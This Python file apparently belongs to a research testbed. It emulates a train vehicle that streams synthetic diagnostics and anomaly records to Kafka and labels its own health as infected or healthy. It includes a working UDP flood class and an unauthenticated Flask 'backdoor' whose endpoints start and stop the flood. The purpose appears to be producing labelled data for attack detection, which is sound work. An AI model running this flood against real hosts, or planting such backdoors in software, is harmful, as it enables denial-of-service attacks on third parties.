import pandas as pd
import numpy as np
import time
from scipy.stats import lognorm
import pickle
import threading
import time
from confluent_kafka import SerializingProducer
from confluent_kafka.serialization import StringSerializer
import logging
import json
import argparse
import signal
from train_monitor import TrainMonitor
import os
import requests
import subprocess
from flask import Flask
import socket


class Attack:
    def __init__(self, target_ip, target_port=80, duration=60, packet_size=1024, delay=0.001):
        """
        Crea un attaccante UDP per eseguire un flood su un target.

        Parametri:
        - target_ip: IP di destinazione
        - target_port: Porta di destinazione (default: 80)
        - duration: Durata dell'attacco in secondi (default: 60)
        - packet_size: Dimensione di ogni pacchetto in byte (default: 1024)
        - delay: Ritardo tra i pacchetti in secondi (default: 0.001)
        """
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.packet_size = packet_size
        self.delay = delay
        


    def attack_condition(self):
        if self.duration == 0:
            return self.alive
        else:
            return self.alive and (time.time() < self.end_time)


    def start_attack(self):
        """
        Esegui un attacco UDP flood sul target specificato.
        """
        # Crea il socket UDP
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        # Crea dati casuali per il pacchetto
        data = os.urandom(self.packet_size)
        
        packets_sent = 0
        bytes_sent = 0
        start_time = time.time()
        self.end_time = start_time + self.duration

        logger.info(f"[BOT] Starting UDP flood to {self.target_ip}:{self.target_port}")
        if self.duration != 0:
            logger.debug(f"[BOT] Test will run for {self.duration} seconds")
        else:
            logger.debug(f"[BOT] Attack will continue until stopped by user.")

        logger.debug(f"[BOT] Packet size: {self.packet_size} bytes")

        try:
            self.alive = True
            while self.attack_condition():
                sock.sendto(data, (self.target_ip, self.target_port))
                packets_sent += 1
                bytes_sent += self.packet_size

                # Stampa le statistiche ogni 10000 pacchetti
                if packets_sent % 10000 == 0:
                    elapsed = time.time() - start_time
                    rate = packets_sent / elapsed if elapsed > 0 else 0
                    mbps = (bytes_sent * 8 / 1000000) / elapsed if elapsed > 0 else 0
                    logger.info(f"[BOT] Sent {packets_sent} packets, {bytes_sent/1000000:.2f} MB ({rate:.2f} pps, {mbps:.2f} Mbps)")

                # Aggiungi un ritardo tra i pacchetti se specificato
                if self.delay > 0:
                    time.sleep(self.delay)

        except Exception:
            logger.debug("[BOT] Attack stopped unexpectedly!")

        finally:
            # Chiudi il socket
            sock.close()

            # Stampa le statistiche finali
            elapsed = time.time() - start_time
            rate = packets_sent / elapsed if elapsed > 0 else 0
            mbps = (bytes_sent * 8 / 1000000) / elapsed if elapsed > 0 else 0

            logger.info("[BOT] Attack ended")
            logger.debug(f"[BOT] Duration: {elapsed:.2f} seconds")
            logger.debug(f"[BOT] Packets sent: {packets_sent}")
            logger.debug(f"[BOT] Data sent: {bytes_sent/1000000:.2f} MB")
            logger.debug(f"[BOT] Rate: {rate:.2f} packets per second")
            logger.debug(f"[BOT] Throughput: {mbps:.2f} Mbps")


# Create a lock object
lock = threading.Lock()

def synchronized(lock):
    """ Synchronization decorator. """
    def wrapper(f):
        def wrapped(*args, **kwargs):
            with lock:
                return f(*args, **kwargs)
        return wrapped
    return wrapper


# load the copula objects later:
with open('copula_anomalie.pkl', 'rb') as f:
    copula_anomalie = pickle.load(f)

with open('copula_normali.pkl', 'rb') as f:
    copula_normali = pickle.load(f)

produced_records = 0
produced_anomalies = 0
produced_diagnostics = 0

HOST_IP = os.getenv("HOST_IP")

# load the probabilities of the classes:
anomaly_probabilities = pd.read_csv('generators/anomaly_cluster_probabilities.csv')
diagnostics_probabilities = pd.read_csv('generators/diagnostics_cluster_probabilities.csv')

# Constants:
columns_to_generate = [
    'Durata', 'CabEnabled_M1', 'CabEnabled_M8', 'ERTMS_PiastraSts', 'HMI_ACPntSts_T2', 'HMI_ACPntSts_T7',
    'HMI_DCPntSts_T2', 'HMI_DCPntSts_T7', 'HMI_Iline', 'HMI_Irsts_T2', 'HMI_Irsts_T7', 'HMI_VBatt_T2',
    'HMI_VBatt_T4', 'HMI_VBatt_T5', 'HMI_VBatt_T7', 'HMI_Vline', 'HMI_impSIL', 'LineVoltType', 'MDS_LedLimVel',
    'MDS_StatoMarcia', '_GPS_LAT', '_GPS_LON', 'ldvvelimps', 'ldvveltreno', 'usB1BCilPres_M1', 'usB1BCilPres_M3',
    'usB1BCilPres_M6', 'usB1BCilPres_M8', 'usB1BCilPres_T2', 'usB1BCilPres_T4', 'usB1BCilPres_T5', 'usB1BCilPres_T7',
    'usB2BCilPres_M1', 'usB2BCilPres_M3', 'usB2BCilPres_M6', 'usB2BCilPres_M8', 'usB2BCilPres_T2', 'usB2BCilPres_T4',
    'usB2BCilPres_T5', 'usB2BCilPres_T7', 'usBpPres', 'usMpPres'
]

all_columns = [
    'Flotta', 'Veicolo', 'Codice', 'Nome', 'Descrizione', 'Test', 'Timestamp', 'Timestamp chiusura', 'Durata', 
    'Posizione', 'Sistema', 'Componente', 'Latitudine', 'Longitudine', 'Contemporaneo', 'Timestamp segnale'
] + columns_to_generate + ['Tipo_Evento', 'Tipo_Evento_Classificato']


def parse_str_list(arg):
    # Split the input string by commas and convert each element to int
    try:
        return [str(x) for x in arg.split(',')]
    except ValueError:
        raise argparse.ArgumentTypeError("Arguments must be strings separated by commas")
    

def parse_int_list(arg):
    # Split the input string by commas and convert each element to int
    try:
        return [int(x) for x in arg.split(',')]
    except ValueError:
        raise argparse.ArgumentTypeError("Arguments must be integers separated by commas")


@synchronized(lock)
def produce_message(data, topic_name):
    global produced_records
    """
    Produce a message to Kafka for a specific sensor type.

    Args:
        data (dict): The data to be sent as a message.
        topic_name (str): The Kafka topic to which the message will be sent.
    """
    try:
        producer.produce(topic=topic_name, value=data)  # Send the message to Kafka
        if topic_name.endswith('HEALTH'):
            pass
        else:
            produced_records += 1

        if produced_records % 50 == 0:
            producer.flush()
        if produced_records % 100 == 0:
            logger.info(f"sent {produced_records} records for now. {produced_anomalies} anomalies and {produced_diagnostics} diagnostics.")
    except Exception as e:
        print(f"Error while producing message to {topic_name} : {e}")


def sample_anomaly_from_global():
    return -1, copula_anomalie.sample(1)


def sample_anomaly_from_clusters():
    cluster_to_sample_from = np.random.choice(
        anomaly_probabilities['cluster'],
        size=1, 
        p=anomaly_probabilities['probability'])
    return cluster_to_sample_from[0], anomaly_generators[cluster_to_sample_from[0]].sample(1)


def health_probes_thread(args):
    logger.info(f"Starting thread for health probes for vehicle: {VEHICLE_NAME}")
    while not stop_threads:
        health_dict = train_monitor.probe_health()
        produce_message(
            data=health_dict, 
            topic_name=f"{VEHICLE_NAME}_HEALTH")
        time.sleep(args.probe_frequency_seconds)


def thread_anomalie(args):
    global produced_anomalies, attack_lock
    logger.info(f"Starting thread for anomalies generation for vehicle: {VEHICLE_NAME}")
    media_durata_anomalie = args.mu_anomalies * args.alpha
    sigma_anomalie = 1 * args.beta
    lognormal_anomalie = lognorm(s=sigma_anomalie, scale=np.exp(np.log(media_durata_anomalie)))
    topic_name = f"{VEHICLE_NAME}_anomalies"

    if args.anomaly_classes == list(range(0,19)):
        sample_anomaly_function = sample_anomaly_from_global
    else:
        sample_anomaly_function = sample_anomaly_from_clusters

    while not stop_threads:
        cluster, synthetic_anomalie = sample_anomaly_function()
        durata_anomalia = lognormal_anomalie.rvs(size=1)
        synthetic_anomalie['Durata'] = durata_anomalia
        synthetic_anomalie['Flotta'] = 'ETR700'
        synthetic_anomalie['Veicolo'] = VEHICLE_NAME
        synthetic_anomalie['Test'] = 'N'
        synthetic_anomalie['Timestamp'] = pd.Timestamp.now()
        synthetic_anomalie['Timestamp chiusura'] = synthetic_anomalie['Timestamp'] + pd.to_timedelta(synthetic_anomalie['Durata'], unit='s')
        synthetic_anomalie['Posizione'] = np.nan
        synthetic_anomalie['Sistema'] = 'VEHICLE'
        synthetic_anomalie['Componente'] = 'VEHICLE'
        synthetic_anomalie['Timestamp segnale'] = np.nan

        for col in all_columns:
            if col not in synthetic_anomalie.columns:
                synthetic_anomalie[col] = np.nan

        synthetic_anomalie = synthetic_anomalie.round(2)
        synthetic_anomalie = synthetic_anomalie[all_columns]
        
        data_to_send = synthetic_anomalie.iloc[0].to_dict()
        data_to_send['Timestamp'] = str(data_to_send['Timestamp'])
        data_to_send['Timestamp chiusura'] = str(data_to_send['Timestamp chiusura'])
        data_to_send['cluster'] = str(cluster)

        if mode == 'SW':
            with attack_lock:
                health_dict = train_monitor.probe_health()
                attack_label = get_status_robust()
                data_to_send.update(health_dict)
                data_to_send['node_status'] = attack_label
            produce_message(data=health_dict, topic_name=f"{VEHICLE_NAME}_HEALTH")
        
        produced_anomalies += 1
        produce_message(data_to_send, topic_name)
        if args.time_emulation:
            time.sleep(durata_anomalia[0])


def sample_normal_from_global():
    return -1, copula_normali.sample(1)


def sample_normal_from_clusters():
    cluster_to_sample_from = np.random.choice(
        diagnostics_probabilities['cluster'],
        size=1, 
        p=diagnostics_probabilities['probability'])
    return cluster_to_sample_from[0], diagnostics_generators[cluster_to_sample_from[0]].sample(1)


def thread_normali(args):
    global produced_diagnostics, attack_lock
    logger.info(f"Starting thread for normal data generation for vehicle: {VEHICLE_NAME}")
    media_durata_normali = args.mu_normal * args.alpha
    sigma_normali = 1 * args.beta
    lognormal_normali = lognorm(s=sigma_normali, scale=np.exp(np.log(media_durata_normali)))
    topic_name = f"{VEHICLE_NAME}_normal_data"

    if args.diagnostics_classes == list(range(0,15)):
        sample_normal_function = sample_normal_from_global
    else:
        sample_normal_function = sample_normal_from_clusters

    while not stop_threads:
        cluster, synthetic_normali = sample_normal_function()
        durata_normale = lognormal_normali.rvs(size=1)
        synthetic_normali['Durata'] = durata_normale
        synthetic_normali['Flotta'] = 'ETR700'
        synthetic_normali['Veicolo'] = VEHICLE_NAME
        synthetic_normali['Test'] = 'N'
        synthetic_normali['Timestamp'] = pd.Timestamp.now()
        synthetic_normali['Timestamp chiusura'] = synthetic_normali['Timestamp'] + pd.to_timedelta(synthetic_normali['Durata'], unit='s')
        synthetic_normali['Posizione'] = np.nan
        synthetic_normali['Sistema'] = 'VEHICLE'
        synthetic_normali['Componente'] = 'VEHICLE'
        synthetic_normali['Timestamp segnale'] = np.nan

        for col in all_columns:
            if col not in synthetic_normali.columns:
                synthetic_normali[col] = np.nan

        synthetic_normali = synthetic_normali.round(2)
        synthetic_normali = synthetic_normali[all_columns]
        # print(f"Nuova diagnostica generata: {synthetic_normali}")
        # Convert data to JSON and send it to Kafka
        data_to_send = synthetic_normali.iloc[0].to_dict()
        data_to_send['Timestamp'] = str(data_to_send['Timestamp'])
        data_to_send['Timestamp chiusura'] = str(data_to_send['Timestamp chiusura'])
        data_to_send['cluster'] = str(cluster)
        
        if mode == 'SW':
            with attack_lock:
                health_dict = train_monitor.probe_health()
                attack_label = get_status_robust()
                data_to_send.update(health_dict)
                data_to_send['node_status'] = attack_label
            produce_message(data=health_dict, topic_name=f"{VEHICLE_NAME}_HEALTH")

        produce_message(data_to_send, topic_name)
        produced_diagnostics += 1
        if args.time_emulation:
            time.sleep(durata_normale[0])


def get_status_from_manager(vehicle_name):
    url = f"http://{HOST_IP}:{MANAGER_PORT}/vehicle-status"
    data = {"vehicle_name": vehicle_name}
    response = requests.post(url, json=data)
    logger.debug(f"Vehicle-status Response Status Code: {response.status_code}")
    logger.debug(f"Vehicle-status Response Body: {response.text}")
    return response.text


def get_status_locally():
    pid_request_command = 'pgrep -f attack.py'
    # issue command in this host
    pid_result = subprocess.run(pid_request_command, shell=True, stdout=subprocess.PIPE)
    if pid_result.returncode == 0:
        return 'INFECTED'
    else:
        return 'HEALTHY'


def get_status_robust():    
    return 'INFECTED' if UNDER_ATTACK else 'HEALTHY'


def adjust_probability(index, probability, main_classes, main_prob, low_prob):
    """
    Normalize the probabilities of classes based on given classes.
    This function adjusts the probabilities of classes by separating them into
    "main classes" (the ones specified in the config file)
    and "low probability classes" (the rest). The first group will have the 80% of probability,
    while the second group will have the remaining 20% of probability.
    """
    if index in main_classes:
        return probability * 0.8 / main_prob
    else:
        return probability * 0.2 / low_prob


def normalize_anomaly_probabilities(anomaly_classes):
    global anomaly_probabilities
    low_prob_classes = [x for x in range(0,19) if x not in anomaly_classes]
    
    main_anomaly_probabilities = anomaly_probabilities[anomaly_probabilities.index.isin(anomaly_classes)]
    main_prob = main_anomaly_probabilities['probability'].sum()

    low_anomaly_probabilities = anomaly_probabilities[anomaly_probabilities.index.isin(low_prob_classes)]
    low_prob = low_anomaly_probabilities['probability'].sum()

    anomaly_probabilities['probability'] = anomaly_probabilities.apply(
        lambda row: adjust_probability(
            row.name, row['probability'], anomaly_classes, main_prob, low_prob), axis=1)


def normalize_diagnostics_probabilities(diagnostics_classes):
    global diagnostics_probabilities
    low_prob_classes = [x for x in range(0,15) if x not in diagnostics_classes]
    # Filter for the subset of clusters
    main_diagnostics_probabilities = diagnostics_probabilities[diagnostics_probabilities.index.isin(diagnostics_classes)]
    main_prob = main_diagnostics_probabilities['probability'].sum()

    low_diagnostics_probabilities = diagnostics_probabilities[diagnostics_probabilities.index.isin(low_prob_classes)]
    low_prob = low_diagnostics_probabilities['probability'].sum()

    diagnostics_probabilities['probability'] = diagnostics_probabilities.apply(
        lambda row: adjust_probability(
            row.name, row['probability'], diagnostics_classes, main_prob, low_prob), axis=1)


def get_anomaly_generators_dict(anomaly_classes):
    normalize_anomaly_probabilities(anomaly_classes)
    anomaly_generators = {}
    for anomaly_class in range(0,19):
        with open(f'generators/anomalies/copula_anomalie_cluster_{anomaly_class}.pkl', 'rb') as f:
            anomaly_generators[anomaly_class] = pickle.load(f)
    return anomaly_generators


def get_diagnostics_generators_dict(diagnostics_classes):
    normalize_diagnostics_probabilities(diagnostics_classes)
    diagnostics_generators = {}
    for diagnostics_class in range(0,15):
        with open(f'generators/diagnostics/copula_normal_cluster_{diagnostics_class}.pkl', 'rb') as f:
            diagnostics_generators[diagnostics_class] = pickle.load(f)
    return diagnostics_generators


def signal_handler(sig, frame):
    global stop_threads
    logger.debug(f"Received signal {sig}. Gracefully stopping {VEHICLE_NAME} producer.")
    stop_threads = True


def configure_no_proxy():
    os.environ['no_proxy'] = os.environ.get('no_proxy', '') + f",{HOST_IP}"


def main():
    global VEHICLE_NAME, MANAGER_PORT, UNDER_ATTACK, attack_lock
    global producer, logger, anomaly_generators, diagnostics_generators
    global anomaly_thread, diagnostics_thread, stop_threads, train_monitor, mode

    parser = argparse.ArgumentParser(description='Kafka Producer for Synthetic Vehicle Data')
    parser.add_argument('--kafka_broker', type=str, default='kafka:9092', help='Kafka broker URL')
    parser.add_argument('--logging_level', type=str, default='INFO', help='Logging level')
    parser.add_argument('--mu_anomalies', type=float, default=157, help='Mu parameter (mean of the mean interarrival times of anomalies)')
    parser.add_argument('--mu_normal', type=float, default=115, help='Mu parameter (mean of the mean interarrival times of normal data)')
    parser.add_argument('--alpha', type=float, default=0.2, help='Alpha parameter (scaling factor of the mean interarrival times of both anomalies and normal data)')
    parser.add_argument('--beta', type=float, default=1.9, help='Beta parameter (scaling factor of std dev of interarrival times of both anomalies and normal data)')
    parser.add_argument('--anomaly_classes',  type=parse_int_list, default=list(range(0,19)))
    parser.add_argument('--diagnostics_classes', type=parse_int_list, default=list(range(0,15)))
    parser.add_argument('--time_emulation', action='store_true', help='paced production of messages according to event simulatedduration')
    parser.add_argument('--ping_thread_timeout', type=float, default=5)
    parser.add_argument('--ping_host', type=str, default="www.google.com")
    parser.add_argument('--probe_frequency_seconds', type=float, default=2)
    parser.add_argument('--probe_metrics',  type=parse_str_list, default=['RTT', 'INBOUND', 'OUTBOUND', 'CPU', 'MEM'])
    parser.add_argument('--mode', type=str, default='OF', help='If OF, then functional sensors are separated from health sensors. If SW, sensors are united.')
    parser.add_argument('--manager_port', type=int, default=5000, help='Port of the train manager service')
    parser.add_argument('--no_proxy_host', action='store_true', help='set the host ip among the no_proxy ips.')
    parser.add_argument("--target_ip", type=str, default='172.18.0.4', help="Target IP address")
    parser.add_argument("--target_port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("--duration", type=int, default=0, help="Duration of the attack in seconds (default: 60)")
    parser.add_argument("--packet_size", type=int, default=1024, help="Size of each packet in bytes (default: 1024)")
    parser.add_argument("--delay", type=float, default=0.001, help="Delay between packets in seconds (default: 0.001)")
    parser.add_argument("--bot_port", type=int, default=5002, help="Backdoor port for attacks")

    args = parser.parse_args()

    MANAGER_PORT = args.manager_port
    UNDER_ATTACK = False

    VEHICLE_NAME = os.environ.get('VEHICLE_NAME')
    assert VEHICLE_NAME is not None, "VEHICLE_NAME environment variable must be set"

    if args.no_proxy_host:
        configure_no_proxy()

    
    logging.basicConfig(format='%(name)s-%(levelname)s-%(message)s', level=str(args.logging_level).upper())
    logger = logging.getLogger(f'[{VEHICLE_NAME}_PROD]')
    args.logger = logger
    args.vehicle_name = VEHICLE_NAME
    mode = args.mode
    
    conf_prod = {
        'bootstrap.servers': args.kafka_broker,
        'key.serializer': StringSerializer('utf_8'),
        'value.serializer': lambda x, ctx: json.dumps(x).encode('utf-8')
    }
    producer = SerializingProducer(conf_prod)

    attack_lock = threading.Lock()
    attack = Attack(
        target_ip=args.target_ip,
        target_port=args.target_port,
        duration=args.duration,
        packet_size=args.packet_size,
        delay=args.delay
    )

    logger.info(f"Setting up producing threads for vehicle: {VEHICLE_NAME}")
    vehicle_args=argparse.Namespace(
        mu_anomalies=args.mu_anomalies,
        mu_normal=args.mu_normal,
        alpha=args.alpha,
        beta=args.beta,
        anomaly_classes=args.anomaly_classes,
        diagnostics_classes=args.diagnostics_classes,
        time_emulation=args.time_emulation
    )

    if args.anomaly_classes != list(range(0,19)):
        anomaly_generators = get_anomaly_generators_dict(args.anomaly_classes)
    if args.diagnostics_classes != list(range(0,15)):
        diagnostics_generators = get_diagnostics_generators_dict(args.diagnostics_classes)

    train_monitor = TrainMonitor(args)
    train_monitor_thread = threading.Thread(target=health_probes_thread, args=(args,))
    anomaly_thread = threading.Thread(target=thread_anomalie, args=(vehicle_args,))
    diagnostics_thread = threading.Thread(target=thread_normali, args=(vehicle_args,))
    attack_thread = None
    # Set daemon to True
    anomaly_thread.daemon = True
    diagnostics_thread.daemon = True
    train_monitor_thread.daemon = True
    


    app = Flask(f'{VEHICLE_NAME}_backdoor')
    @app.route('/start-attack', methods=['POST'])
    def start_attack():
        global UNDER_ATTACK, attack_thread
        
        with attack_lock:
            if not UNDER_ATTACK:
                attack_thread = threading.Thread(target=attack.start_attack)
                attack_thread.daemon = True
                attack_thread.start()
                UNDER_ATTACK = True
                return 'Attack launched', 200
            else:
                return 'Aleady under attack!!', 400
    

    @app.route('/stop-attack', methods=['POST'])
    def stop_attack():
        global UNDER_ATTACK, attack_thread
        with attack_lock:
            if UNDER_ATTACK:
                attack.alive = False
                attack_thread.join(1)
                UNDER_ATTACK = False
                return 'Attack stopped', 200
            else:
                return 'Wasn\'t under attack!!', 400
    

    flask_thread = threading.Thread(target=app.run, kwargs={'host': '0.0.0.0', 'port': args.bot_port})
    flask_thread.daemon = True
    flask_thread.start()
    logger.info(f"Backdoor installed at {args.bot_port}")
    flask_logger = logging.getLogger('werkzeug')
    flask_logger.name = f"[{VEHICLE_NAME}_BOT]"
    def custom_handle(record):
        return
    flask_logger.handle = custom_handle

    # Start threads
    logger.info(f"Starting threads...")
    signal.signal(signal.SIGINT, lambda sig, frame: signal_handler(sig, frame))
    stop_threads = False
    anomaly_thread.start()
    diagnostics_thread.start()
    if mode == 'OF': train_monitor_thread.start()
    
    while not stop_threads:
        time.sleep(0.1)
    logger.info(f"Stopping producing threads...")
    anomaly_thread.join(1)
    diagnostics_thread.join(1)
    with attack_lock:
        if UNDER_ATTACK:
            attack.alive = False
            attack_thread.join(1)
    if mode == 'OF': train_monitor_thread.join(1)
    logger.info(f"Stopped producing threads.")


if __name__ == '__main__':
    main()